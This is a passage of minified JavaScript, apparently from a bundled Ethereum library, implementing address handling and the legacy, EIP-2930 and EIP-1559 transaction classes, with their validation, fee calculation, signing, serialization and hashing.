            static zero() {
                return new nf(Fd(20))
            }
            equals(e) {
                return vs(this.buf, e.buf)
            }
            isZero() {
                return this.equals(nf.zero())
            }
            toString() {
                return As(this.buf)
            }
            toArray() {
                return this.buf
            }
            static publicToAddress(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                    n = e;
                if (Ld(n), t && 64 !== n.length && (n = wd.ProjectivePoint.fromHex(n).toRawBytes(!1).slice(1)), 64 !== n.length) throw new Error("Expected pubKey to be of length 64");
                return hi(n).slice(-20)
            }
        }
        const rf = e => {
                let t, n;
                if (tf(e)) {
                    t = e;
                    const r = [];
                    for (let t = 0; t < e.length; t += 1) {
                        const n = e[t],
                            i = Md(n.address),
                            o = [];
                        for (let e = 0; e < n.storageKeys.length; e += 1) o.push(Md(n.storageKeys[e]));
                        r.push([i, o])
                    }
                    n = r
                } else {
                    n = null !== e && void 0 !== e ? e : [];
                    const r = [];
                    for (let e = 0; e < n.length; e += 1) {
                        const t = n[e],
                            i = As(t[0]),
                            o = [];
                        for (let e = 0; e < t[1].length; e += 1) o.push(As(t[1][e]));
                        const a = {
                            address: i,
                            storageKeys: o
                        };
                        r.push(a)
                    }
                    t = r
                }
                return {
                    AccessListJSON: t,
                    accessList: n
                }
            },
            of = e => {
                for (let t = 0; t < e.length; t += 1) {
                    const n = e[t],
                        r = n[0],
                        i = n[1];
                    if (void 0 !== n[2]) throw new Error("Access list item cannot have 3 elements. It can only have an address, and an array of storage slots.");
                    if (20 !== r.length) throw new Error("Invalid EIP-2930 transaction: address length should be 20 bytes");
                    for (let e = 0; e < i.length; e += 1)
                        if (32 !== i[e].length) throw new Error("Invalid EIP-2930 transaction: storage slot length should be 32 bytes")
                }
            },
            af = e => {
                const t = [];
                for (let n = 0; n < e.length; n += 1) {
                    const r = e[n],
                        i = {
                            address: As(Dd(r[0], 20)),
                            storageKeys: []
                        },
                        o = r && r[1];
                    for (let e = 0; e < o.length; e += 1) {
                        const t = o[e];
                        i.storageKeys.push(As(Dd(t, 32)))
                    }
                    t.push(i)
                }
                return t
            },
            sf = (e, t) => {
                const n = t.param("gasPrices", "accessListStorageKeyCost"),
                    r = t.param("gasPrices", "accessListAddressCost");
                let i = 0;
                for (let o = 0; o < e.length; o += 1) {
                    i += e[o][1].length
                }
                return e.length * Number(r) + i * Number(n)
            };
        class cf {
            constructor(e, t) {
                var n, r;
                this.cache = {
                    hash: void 0,
                    dataFee: void 0
                }, this.activeCapabilities = [], this.DEFAULT_CHAIN = Sd.Mainnet, this.DEFAULT_HARDFORK = Cd.Merge;
                const {
                    nonce: i,
                    gasLimit: o,
                    to: a,
                    value: s,
                    data: c,
                    v: l,
                    r: u,
                    s: d,
                    type: f
                } = e;
                this._type = Number(jd(Md(f))), this.txOptions = t;
                const h = Md("" === a ? "0x" : a),
                    p = Md("" === l ? "0x" : l),
                    m = Md("" === u ? "0x" : u),
                    g = Md("" === d ? "0x" : d);
                this.nonce = jd(Md("" === i ? "0x" : i)), this.gasLimit = jd(Md("" === o ? "0x" : o)), this.to = h.length > 0 ? new nf(h) : void 0, this.value = jd(Md("" === s ? "0x" : s)), this.data = Md("" === c ? "0x" : c), this.v = p.length > 0 ? jd(p) : void 0, this.r = m.length > 0 ? jd(m) : void 0, this.s = g.length > 0 ? jd(g) : void 0, this._validateCannotExceedMaxInteger({
                    value: this.value,
                    r: this.r,
                    s: this.s
                }), this._validateCannotExceedMaxInteger({
                    gasLimit: this.gasLimit
                }, 64), this._validateCannotExceedMaxInteger({
                    nonce: this.nonce
                }, 64, !0);
                const v = void 0 === this.to || null === this.to,
                    y = null !== (n = t.allowUnlimitedInitCodeSize) && void 0 !== n && n,
                    b = null !== (r = t.common) && void 0 !== r ? r : this._getCommon();
                v && b.isActivatedEIP(3860) && !y && ((e, t) => {
                    const n = e.param("vm", "maxInitCodeSize");
                    if (n && BigInt(t) > n) throw new Error("the initcode size of this transaction is too large: it is ".concat(t, " while the max is ").concat(e.param("vm", "maxInitCodeSize")))
                })(b, this.data.length)
            }
            get type() {
                return this._type
            }
            supports(e) {
                return this.activeCapabilities.includes(e)
            }
            validate() {
                let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                const t = [];
                return this.getBaseFee() > this.gasLimit && t.push("gasLimit is too low. given ".concat(this.gasLimit, ", need at least ").concat(this.getBaseFee())), this.isSigned() && !this.verifySignature() && t.push("Invalid Signature"), e ? t : 0 === t.length
            }
            _validateYParity() {
                const {
                    v: e
                } = this;
                if (void 0 !== e && e !== BigInt(0) && e !== BigInt(1)) {
                    const e = this._errorMsg("The y-parity of the transaction should either be 0 or 1");
                    throw new Error(e)
                }
            }
            _validateHighS() {
                const {
                    s: e
                } = this;
                if (this.common.gteHardfork("homestead") && void 0 !== e && e > kd) {
                    const e = this._errorMsg("Invalid Signature: s-values greater than secp256k1n/2 are considered invalid");
                    throw new Error(e)
                }
            }
            getBaseFee() {
                const e = this.common.param("gasPrices", "tx");
                let t = this.getDataFee();
                if (e && (t += e), this.common.gteHardfork("homestead") && this.toCreationAddress()) {
                    const e = this.common.param("gasPrices", "txCreation");
                    e && (t += e)
                }
                return t
            }
            getDataFee() {
                const e = this.common.param("gasPrices", "txDataZero"),
                    t = this.common.param("gasPrices", "txDataNonZero");
                let n = BigInt(0);
                for (let r = 0; r < this.data.length; r += 1) 0 === this.data[r] ? n += e : n += t;
                if ((void 0 === this.to || null === this.to) && this.common.isActivatedEIP(3860)) {
                    const e = BigInt(Math.ceil(this.data.length / 32));
                    n += this.common.param("gasPrices", "initCodeWordCost") * e
                }
                return n
            }
            toCreationAddress() {
                return void 0 === this.to || 0 === this.to.buf.length
            }
            isSigned() {
                const {
                    v: e,
                    r: t,
                    s: n
                } = this;
                return void 0 !== e && void 0 !== t && void 0 !== n
            }
            verifySignature() {
                try {
                    const e = this.getSenderPublicKey();
                    return 0 !== Hd(e).length
                } catch (Qy) {
                    return !1
                }
            }
            getSenderAddress() {
                return new nf(nf.publicToAddress(this.getSenderPublicKey()))
            }
            sign(e) {
                if (32 !== e.length) {
                    const e = this._errorMsg("Private key must be 32 bytes in length.");
                    throw new Error(e)
                }
                let t = !1;
                0 === this.type && this.common.gteHardfork("spuriousDragon") && !this.supports(ef.EIP155ReplayProtection) && (this.activeCapabilities.push(ef.EIP155ReplayProtection), t = !0);
                const n = this.getMessageToSign(!0),
                    {
                        v: r,
                        r: i,
                        s: o
                    } = this._ecsign(n, e),
                    a = this._processSignature(r, i, o);
                if (t) {
                    const e = this.activeCapabilities.indexOf(ef.EIP155ReplayProtection);
                    e > -1 && this.activeCapabilities.splice(e, 1)
                }
                return a
            }
            _getCommon(e, t) {
                var n, r, i, o;
                if (void 0 !== t) {
                    const n = jd(Md(t));
                    if (e) {
                        if (e.chainId() !== n) {
                            const e = this._errorMsg("The chain ID does not match the chain ID of Common");
                            throw new Error(e)
                        }
                        return e.copy()
                    }
                    return $d.isSupportedChainId(n) ? new $d({
                        chain: n,
                        hardfork: this.DEFAULT_HARDFORK
                    }) : $d.custom({
                        name: "custom-chain",
                        networkId: n,
                        chainId: n
                    }, {
                        baseChain: this.DEFAULT_CHAIN,
                        hardfork: this.DEFAULT_HARDFORK
                    })
                }
                if ((null === e || void 0 === e ? void 0 : e.copy) && "function" === typeof(null === e || void 0 === e ? void 0 : e.copy)) return e.copy();
                if (e) {
                    const t = "function" === typeof e.hardfork ? e.hardfork() : e.hardfork;
                    return $d.custom({
                        name: "custom-chain",
                        networkId: e.networkId ? e.networkId() : null !== (r = BigInt(null === (n = e.customChain) || void 0 === n ? void 0 : n.networkId)) && void 0 !== r ? r : void 0,
                        chainId: e.chainId ? e.chainId() : null !== (o = BigInt(null === (i = e.customChain) || void 0 === i ? void 0 : i.chainId)) && void 0 !== o ? o : void 0
                    }, {
                        baseChain: this.DEFAULT_CHAIN,
                        hardfork: t || this.DEFAULT_HARDFORK
                    })
                }
                return new $d({
                    chain: this.DEFAULT_CHAIN,
                    hardfork: this.DEFAULT_HARDFORK
                })
            }
            _validateCannotExceedMaxInteger(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 256,
                    n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                for (const [r, i] of Object.entries(e)) switch (t) {
                    case 64:
                        if (n) {
                            if (void 0 !== i && i >= xd) {
                                const e = this._errorMsg("".concat(r, " cannot equal or exceed MAX_UINT64 (2^64-1), given ").concat(i));
                                throw new Error(e)
                            }
                        } else if (void 0 !== i && i > xd) {
                            const e = this._errorMsg("".concat(r, " cannot exceed MAX_UINT64 (2^64-1), given ").concat(i));
                            throw new Error(e)
                        }
                        break;
                    case 256:
                        if (n) {
                            if (void 0 !== i && i >= Ad) {
                                const e = this._errorMsg("".concat(r, " cannot equal or exceed MAX_INTEGER (2^256-1), given ").concat(i));
                                throw new Error(e)
                            }
                        } else if (void 0 !== i && i > Ad) {
                            const e = this._errorMsg("".concat(r, " cannot exceed MAX_INTEGER (2^256-1), given ").concat(i));
                            throw new Error(e)
                        }
                        break;
                    default:
                        {
                            const e = this._errorMsg("unimplemented bits value");
                            throw new Error(e)
                        }
                }
            }
            static _validateNotArray(e) {
                const t = ["nonce", "gasPrice", "gasLimit", "to", "value", "data", "v", "r", "s", "type", "baseFee", "maxFeePerGas", "chainId"];
                for (const [n, r] of Object.entries(e))
                    if (t.includes(n) && Array.isArray(r)) throw new Error("".concat(n, " cannot be an array"))
            }
            _getSharedErrorPostfix() {
                let e = "";
                try {
                    e = this.isSigned() ? As(this.hash()) : "not available (unsigned)"
                } catch (Qy) {
                    e = "error"
                }
                let t = "";
                try {
                    t = this.isSigned().toString()
                } catch (Qy) {
                    e = "error"
                }
                let n = "";
                try {
                    n = this.common.hardfork()
                } catch (Qy) {
                    n = "error"
                }
                let r = "tx type=".concat(this.type, " hash=").concat(e, " nonce=").concat(this.nonce, " value=").concat(this.value, " ");
                return r += "signed=".concat(t, " hf=").concat(n), r
            }
            _ecsign(e, t, n) {
                const r = wd.sign(e, t),
                    i = r.toCompactRawBytes();
                return {
                    r: i.subarray(0, 32),
                    s: i.subarray(32, 64),
                    v: void 0 === n ? BigInt(r.recovery + 27) : BigInt(r.recovery + 35) + BigInt(n) * BigInt(2)
                }
            }
            static fromSerializedTx(e) {}
            static fromTxData(e) {}
        }
        const lf = ks(2..toString(16).padStart(2, "0"));
        class uf extends cf {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                var n;
                super(Object.assign(Object.assign({}, e), {
                    type: 2
                }), t), this.DEFAULT_HARDFORK = "london";
                const {
                    chainId: r,
                    accessList: i,
                    maxFeePerGas: o,
                    maxPriorityFeePerGas: a
                } = e;
                if (this.common = this._getCommon(t.common, r), this.chainId = this.common.chainId(), !this.common.isActivatedEIP(1559)) throw new Error("EIP-1559 not enabled on Common");
                this.activeCapabilities = this.activeCapabilities.concat([1559, 2718, 2930]);
                const s = rf(null !== i && void 0 !== i ? i : []);
                if (this.accessList = s.accessList, this.AccessListJSON = s.AccessListJSON, of (this.accessList), this.maxFeePerGas = jd(Md("" === o ? "0x" : o)), this.maxPriorityFeePerGas = jd(Md("" === a ? "0x" : a)), this._validateCannotExceedMaxInteger({
                        maxFeePerGas: this.maxFeePerGas,
                        maxPriorityFeePerGas: this.maxPriorityFeePerGas
                    }), cf._validateNotArray(e), this.gasLimit * this.maxFeePerGas > Ad) {
                    const e = this._errorMsg("gasLimit * maxFeePerGas cannot exceed MAX_INTEGER (2^256-1)");
                    throw new Error(e)
                }
                if (this.maxFeePerGas < this.maxPriorityFeePerGas) {
                    const e = this._errorMsg("maxFeePerGas cannot be less than maxPriorityFeePerGas (The total must be the larger of the two)");
                    throw new Error(e)
                }
                this._validateYParity(), this._validateHighS();
                (null === (n = null === t || void 0 === t ? void 0 : t.freeze) || void 0 === n || n) && Object.freeze(this)
            }
            static fromTxData(e) {
                return new uf(e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {})
            }
            static fromSerializedTx(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!vs(e.subarray(0, 1), lf)) throw new Error("Invalid serialized tx input: not an EIP-1559 transaction (wrong tx type, expected: ".concat(2, ", received: ").concat(As(e.subarray(0, 1))));
                const n = Qd.Tj.decode(e.subarray(1));
                if (!Array.isArray(n)) throw new Error("Invalid serialized tx input: must be array");
                return uf.fromValuesArray(n, t)
            }
            static fromValuesArray(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (9 !== e.length && 12 !== e.length) throw new Error("Invalid EIP-1559 transaction. Only expecting 9 values (for unsigned tx) or 12 values (for signed tx).");
                const [n, r, i, o, a, s, c, l, u, d, f, h] = e;
                return this._validateNotArray({
                    chainId: n,
                    v: d
                }), Ba({
                    nonce: r,
                    maxPriorityFeePerGas: i,
                    maxFeePerGas: o,
                    gasLimit: a,
                    value: c,
                    v: d,
                    r: f,
                    s: h
                }), new uf({
                    chainId: jd(n),
                    nonce: r,
                    maxPriorityFeePerGas: i,
                    maxFeePerGas: o,
                    gasLimit: a,
                    to: s,
                    value: c,
                    data: l,
                    accessList: null !== u && void 0 !== u ? u : [],
                    v: void 0 !== d ? jd(d) : void 0,
                    r: f,
                    s: h
                }, t)
            }
            getDataFee() {
                if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork()) return this.cache.dataFee.value;
                let e = super.getDataFee();
                return e += BigInt(sf(this.accessList, this.common)), Object.isFrozen(this) && (this.cache.dataFee = {
                    value: e,
                    hardfork: this.common.hardfork()
                }), e
            }
            getUpfrontCost() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : BigInt(0);
                const t = this.maxPriorityFeePerGas,
                    n = this.maxFeePerGas - e,
                    r = (t < n ? t : n) + e;
                return this.gasLimit * r + this.value
            }
            raw() {
                return [zd(this.chainId), zd(this.nonce), zd(this.maxPriorityFeePerGas), zd(this.maxFeePerGas), zd(this.gasLimit), void 0 !== this.to ? this.to.buf : Uint8Array.from([]), zd(this.value), this.data, this.accessList, void 0 !== this.v ? zd(this.v) : Uint8Array.from([]), void 0 !== this.r ? zd(this.r) : Uint8Array.from([]), void 0 !== this.s ? zd(this.s) : Uint8Array.from([])]
            }
            serialize() {
                const e = this.raw();
                return gs(lf, Qd.Tj.encode(e))
            }
            getMessageToSign() {
                let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                const t = this.raw().slice(0, 9),
                    n = gs(lf, Qd.Tj.encode(t));
                return e ? hi(n) : n
            }
            hash() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                    throw new Error(e)
                }
                return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = hi(this.serialize())), this.cache.hash) : hi(this.serialize())
            }
            getMessageToVerifySignature() {
                return this.getMessageToSign()
            }
            getSenderPublicKey() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("Cannot call this method if transaction is not signed");
                    throw new Error(e)
                }
                const e = this.getMessageToVerifySignature(),
                    {
                        v: t,
                        r: n,
                        s: r
                    } = this;
                this._validateHighS();
                try {
                    return Gd(e, t + BigInt(27), zd(n), zd(r))
                } catch (Qy) {
                    const t = this._errorMsg("Invalid Signature");
                    throw new Error(t)
                }
            }
            _processSignature(e, t, n) {
                const r = Object.assign(Object.assign({}, this.txOptions), {
                    common: this.common
                });
                return uf.fromTxData({
                    chainId: this.chainId,
                    nonce: this.nonce,
                    maxPriorityFeePerGas: this.maxPriorityFeePerGas,
                    maxFeePerGas: this.maxFeePerGas,
                    gasLimit: this.gasLimit,
                    to: this.to,
                    value: this.value,
                    data: this.data,
                    accessList: this.accessList,
                    v: e - BigInt(27),
                    r: jd(t),
                    s: jd(n)
                }, r)
            }
            toJSON() {
                const e = af(this.accessList);
                return {
                    chainId: Ud(this.chainId),
                    nonce: Ud(this.nonce),
                    maxPriorityFeePerGas: Ud(this.maxPriorityFeePerGas),
                    maxFeePerGas: Ud(this.maxFeePerGas),
                    gasLimit: Ud(this.gasLimit),
                    to: void 0 !== this.to ? this.to.toString() : void 0,
                    value: Ud(this.value),
                    data: As(this.data),
                    accessList: e,
                    v: void 0 !== this.v ? Ud(this.v) : void 0,
                    r: void 0 !== this.r ? Ud(this.r) : void 0,
                    s: void 0 !== this.s ? Ud(this.s) : void 0
                }
            }
            errorStr() {
                let e = this._getSharedErrorPostfix();
                return e += " maxFeePerGas=".concat(this.maxFeePerGas, " maxPriorityFeePerGas=").concat(this.maxPriorityFeePerGas), e
            }
            _errorMsg(e) {
                return "".concat(e, " (").concat(this.errorStr(), ")")
            }
        }
        const df = ks(1..toString(16).padStart(2, "0"));
        class ff extends cf {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                var n;
                super(Object.assign(Object.assign({}, e), {
                    type: 1
                }), t), this.DEFAULT_HARDFORK = "berlin";
                const {
                    chainId: r,
                    accessList: i,
                    gasPrice: o
                } = e;
                if (this.common = this._getCommon(t.common, r), this.chainId = this.common.chainId(), !this.common.isActivatedEIP(2930)) throw new Error("EIP-2930 not enabled on Common");
                this.activeCapabilities = this.activeCapabilities.concat([2718, 2930]);
                const a = rf(null !== i && void 0 !== i ? i : []);
                if (this.accessList = a.accessList, this.AccessListJSON = a.AccessListJSON, of (this.accessList), this.gasPrice = jd(Md("" === o ? "0x" : o)), this._validateCannotExceedMaxInteger({
                        gasPrice: this.gasPrice
                    }), cf._validateNotArray(e), this.gasPrice * this.gasLimit > Ad) {
                    const e = this._errorMsg("gasLimit * gasPrice cannot exceed MAX_INTEGER");
                    throw new Error(e)
                }
                this._validateYParity(), this._validateHighS();
                (null === (n = null === t || void 0 === t ? void 0 : t.freeze) || void 0 === n || n) && Object.freeze(this)
            }
            static fromTxData(e) {
                return new ff(e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {})
            }
            static fromSerializedTx(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!vs(e.subarray(0, 1), df)) throw new Error("Invalid serialized tx input: not an EIP-2930 transaction (wrong tx type, expected: ".concat(1, ", received: ").concat(As(e.subarray(0, 1))));
                const n = Qd.Tj.decode(Uint8Array.from(e.subarray(1)));
                if (!Array.isArray(n)) throw new Error("Invalid serialized tx input: must be array");
                return ff.fromValuesArray(n, t)
            }
            static fromValuesArray(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (8 !== e.length && 11 !== e.length) throw new Error("Invalid EIP-2930 transaction. Only expecting 8 values (for unsigned tx) or 11 values (for signed tx).");
                const [n, r, i, o, a, s, c, l, u, d, f] = e;
                this._validateNotArray({
                    chainId: n,
                    v: u
                }), Ba({
                    nonce: r,
                    gasPrice: i,
                    gasLimit: o,
                    value: s,
                    v: u,
                    r: d,
                    s: f
                });
                return new ff({
                    chainId: jd(n),
                    nonce: r,
                    gasPrice: i,
                    gasLimit: o,
                    to: a,
                    value: s,
                    data: c,
                    accessList: null !== l && void 0 !== l ? l : [],
                    v: void 0 !== u ? jd(u) : void 0,
                    r: d,
                    s: f
                }, t)
            }
            getDataFee() {
                if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork()) return this.cache.dataFee.value;
                let e = super.getDataFee();
                return e += BigInt(sf(this.accessList, this.common)), Object.isFrozen(this) && (this.cache.dataFee = {
                    value: e,
                    hardfork: this.common.hardfork()
                }), e
            }
            getUpfrontCost() {
                return this.gasLimit * this.gasPrice + this.value
            }
            raw() {
                return [zd(this.chainId), zd(this.nonce), zd(this.gasPrice), zd(this.gasLimit), void 0 !== this.to ? this.to.buf : Uint8Array.from([]), zd(this.value), this.data, this.accessList, void 0 !== this.v ? zd(this.v) : Uint8Array.from([]), void 0 !== this.r ? zd(this.r) : Uint8Array.from([]), void 0 !== this.s ? zd(this.s) : Uint8Array.from([])]
            }
            serialize() {
                const e = this.raw();
                return gs(df, Qd.Tj.encode(e))
            }
            getMessageToSign() {
                let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                const t = this.raw().slice(0, 8),
                    n = gs(df, Qd.Tj.encode(t));
                return e ? hi(n) : n
            }
            hash() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                    throw new Error(e)
                }
                return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = hi(this.serialize())), this.cache.hash) : hi(this.serialize())
            }
            getMessageToVerifySignature() {
                return this.getMessageToSign()
            }
            getSenderPublicKey() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("Cannot call this method if transaction is not signed");
                    throw new Error(e)
                }
                const e = this.getMessageToVerifySignature(),
                    {
                        v: t,
                        r: n,
                        s: r
                    } = this;
                this._validateHighS();
                try {
                    return Gd(e, t + BigInt(27), zd(n), zd(r))
                } catch (Qy) {
                    const t = this._errorMsg("Invalid Signature");
                    throw new Error(t)
                }
            }
            _processSignature(e, t, n) {
                const r = Object.assign(Object.assign({}, this.txOptions), {
                    common: this.common
                });
                return ff.fromTxData({
                    chainId: this.chainId,
                    nonce: this.nonce,
                    gasPrice: this.gasPrice,
                    gasLimit: this.gasLimit,
                    to: this.to,
                    value: this.value,
                    data: this.data,
                    accessList: this.accessList,
                    v: e - BigInt(27),
                    r: jd(t),
                    s: jd(n)
                }, r)
            }
            toJSON() {
                const e = af(this.accessList);
                return {
                    chainId: Ud(this.chainId),
                    nonce: Ud(this.nonce),
                    gasPrice: Ud(this.gasPrice),
                    gasLimit: Ud(this.gasLimit),
                    to: void 0 !== this.to ? this.to.toString() : void 0,
                    value: Ud(this.value),
                    data: As(this.data),
                    accessList: e,
                    v: void 0 !== this.v ? Ud(this.v) : void 0,
                    r: void 0 !== this.r ? Ud(this.r) : void 0,
                    s: void 0 !== this.s ? Ud(this.s) : void 0
                }
            }
            errorStr() {
                var e, t;
                let n = this._getSharedErrorPostfix();
                return n += " gasPrice=".concat(this.gasPrice, " accessListCount=").concat(null !== (t = null === (e = this.accessList) || void 0 === e ? void 0 : e.length) && void 0 !== t ? t : 0), n
            }
            _errorMsg(e) {
                return "".concat(e, " (").concat(this.errorStr(), ")")
            }
        }

        function hf(e, t) {
            const n = Number(e),
                r = 2 * Number(t);
            return n === r + 35 || n === r + 36
        }
        class pf extends cf {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                var n;
                if (super(Object.assign(Object.assign({}, e), {
                        type: 0
                    }), t), this.common = this._validateTxV(this.v, t.common), this.gasPrice = jd(Md("" === e.gasPrice ? "0x" : e.gasPrice)), this.gasPrice * this.gasLimit > Ad) {
                    const e = this._errorMsg("gas limit * gasPrice cannot exceed MAX_INTEGER (2^256-1)");
                    throw new Error(e)
                }
                this._validateCannotExceedMaxInteger({
                    gasPrice: this.gasPrice
                }), cf._validateNotArray(e), this.common.gteHardfork("spuriousDragon") && (this.isSigned() ? hf(this.v, this.common.chainId()) && this.activeCapabilities.push(ef.EIP155ReplayProtection) : this.activeCapabilities.push(ef.EIP155ReplayProtection));
                (null === (n = null === t || void 0 === t ? void 0 : t.freeze) || void 0 === n || n) && Object.freeze(this)
            }
            static fromTxData(e) {
                return new pf(e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {})
            }
            static fromSerializedTx(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const n = Qd.Tj.decode(e);
                if (!Array.isArray(n)) throw new Error("Invalid serialized tx input. Must be array");
                return this.fromValuesArray(n, t)
            }
            static fromValuesArray(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (6 !== e.length && 9 !== e.length) throw new Error("Invalid transaction. Only expecting 6 values (for unsigned tx) or 9 values (for signed tx).");
                const [n, r, i, o, a, s, c, l, u] = e;
                return Ba({
                    nonce: n,
                    gasPrice: r,
                    gasLimit: i,
                    value: a,
                    v: c,
                    r: l,
                    s: u
                }), new pf({
                    nonce: n,
                    gasPrice: r,
                    gasLimit: i,
                    to: o,
                    value: a,
                    data: s,
                    v: c,
                    r: l,
                    s: u
                }, t)
            }
            raw() {
                return [zd(this.nonce), zd(this.gasPrice), zd(this.gasLimit), void 0 !== this.to ? this.to.buf : Uint8Array.from([]), zd(this.value), this.data, void 0 !== this.v ? zd(this.v) : Uint8Array.from([]), void 0 !== this.r ? zd(this.r) : Uint8Array.from([]), void 0 !== this.s ? zd(this.s) : Uint8Array.from([])]
            }
            serialize() {
                return Qd.Tj.encode(this.raw())
            }
            _getMessageToSign() {
                const e = [zd(this.nonce), zd(this.gasPrice), zd(this.gasLimit), void 0 !== this.to ? this.to.buf : Uint8Array.from([]), zd(this.value), this.data];
                return this.supports(ef.EIP155ReplayProtection) && (e.push(Md(this.common.chainId())), e.push(Hd(Md(0))), e.push(Hd(Md(0)))), e
            }
            getMessageToSign() {
                let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                const t = this._getMessageToSign();
                return e ? hi(Qd.Tj.encode(t)) : t
            }
            getDataFee() {
                return this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork() ? this.cache.dataFee.value : (Object.isFrozen(this) && (this.cache.dataFee = {
                    value: super.getDataFee(),
                    hardfork: this.common.hardfork()
                }), super.getDataFee())
            }
            getUpfrontCost() {
                return this.gasLimit * this.gasPrice + this.value
            }
            hash() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                    throw new Error(e)
                }
                return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = hi(Qd.Tj.encode(this.raw()))), this.cache.hash) : hi(Qd.Tj.encode(this.raw()))
            }
            getMessageToVerifySignature() {
                if (!this.isSigned()) {
                    const e = this._errorMsg("This transaction is not signed");
                    throw new Error(e)
                }
                const e = this._getMessageToSign();
                return hi(Qd.Tj.encode(e))
            }
            getSenderPublicKey() {
                const e = this.getMessageToVerifySignature(),
                    {
                        v: t,
                        r: n,
                        s: r
                    } = this;
                this._validateHighS();
                try {
                    return Gd(e, t, zd(n), zd(r), this.supports(ef.EIP155ReplayProtection) ? this.common.chainId() : void 0)
                } catch (Qy) {
                    const t = this._errorMsg("Invalid Signature");
                    throw new Error(t)
                }
            }
            _processSignature(e, t, n) {
                let r = e;
                this.supports(ef.EIP155ReplayProtection) && (r += this.common.chainId() * BigInt(2) + BigInt(8));
                const i = Object.assign(Object.assign({}, this.txOptions), {
                    common: this.common
                });
                return pf.fromTxData({
                    nonce: this.nonce,
                    gasPrice: this.gasPrice,
                    gasLimit: this.gasLimit,
                    to: this.to,
                    value: this.value,
                    data: this.data,
                    v: r,
                    r: jd(t),
                    s: jd(n)
                }, i)
            }
            toJSON() {
                return {
                    nonce: Ud(this.nonce),
                    gasPrice: Ud(this.gasPrice),
                    gasLimit: Ud(this.gasLimit),
                    to: void 0 !== this.to ? this.to.toString() : void 0,
                    value: Ud(this.value),
                    data: As(this.data),
                    v: void 0 !== this.v ? Ud(this.v) : void 0,
                    r: void 0 !== this.r ? Ud(this.r) : void 0,
                    s: void 0 !== this.s ? Ud(this.s) : void 0
                }
            }
            _validateTxV(e, t) {
                let n;
                const r = void 0 !== e ? Number(e) : void 0;
                if (void 0 !== r && r < 37 && 27 !== r && 28 !== r) throw new Error("Legacy txs need either v = 27/28 or v >= 37 (EIP-155 replay protection), got v = ".concat(r));
                if (void 0 !== r && 0 !== r && (!t || t.gteHardfork("spuriousDragon")) && 27 !== r && 28 !== r)
                    if (t) {
                        if (!hf(BigInt(r), t.chainId())) throw new Error("Incompatible EIP155-based V ".concat(r, " and chain id ").concat(t.chainId(), ". See the Common parameter of the Transaction constructor to set the chain id."))
                    } else {
                        let e;
                        e = (r - 35) % 2 === 0 ? 35 : 36, n = BigInt(r - e) / BigInt(2)
                    }
                return this._getCommon(t, n)
            }
            errorStr() {
                let e = this._getSharedErrorPostfix();
                return e += " gasPrice=".concat(this.gasPrice), e
            }
            _errorMsg(e) {
                return "".concat(e, " (").concat(this.errorStr(), ")")
            }
        }
        const mf = new Map;
        class gf {
            constructor() {}
            static typeToInt(e) {
                return Number(jd(Md(e)))
            }
            static registerTransactionType(e, t) {
                const n = gf.typeToInt(e);
                mf.set(n, t)
            }
            static fromTxData(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!("type" in e) || void 0 === e.type) return pf.fromTxData(e, t);
                const n = gf.typeToInt(e.type);
                if (0 === n) return pf.fromTxData(e, t);
                if (1 === n) return ff.fromTxData(e, t);
                if (2 === n) return uf.fromTxData(e, t);
                const r = mf.get(n);
                if (null === r || void 0 === r ? void 0 : r.fromTxData) return r.fromTxData(e, t);
                throw new Error("Tx instantiation with type ".concat(n, " not supported"))
            }
            static fromSerializedData(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!(e[0] <= 127)) return pf.fromSerializedTx(e, t);
                switch (e[0]) {
                    case 1:
                        return ff.fromSerializedTx(e, t);
                    case 2:
                        return uf.fromSerializedTx(e, t);
                    default:
                        {
                            const n = mf.get(Number(e[0]));
                            if (null === n || void 0 === n ? void 0 : n.fromSerializedTx) return n.fromSerializedTx(e, t);
                            throw new Error("TypedTransaction with ID ".concat(e[0], " unknown"))
                        }
                }
            }
            static fromBlockBodyData(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (ms(e)) return this.fromSerializedData(e, t);
                if (Array.isArray(e)) return pf.fromValuesArray(e, t);
                throw new Error("Cannot decode transaction: unknown type input")
            }
        }
        var vf = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
